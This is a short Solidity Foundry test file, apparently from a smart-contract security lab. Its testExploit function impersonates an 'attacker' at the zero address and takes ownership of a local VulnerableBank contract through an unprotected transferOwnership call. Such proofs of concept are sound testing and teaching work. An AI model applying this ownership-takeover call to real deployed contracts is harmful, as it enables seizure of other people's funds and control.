// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0);

    function setUp() public override {
        target = new VulnerableBank();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        
        // Attempt to transfer ownership to the zero-address
        target.transferOwnership(attacker);

        assertEq(target.owner(), attacker, "Owner should be the attacker");
        balanceLog.logBalances("Balances after exploit", address(this), address(target));
    }
}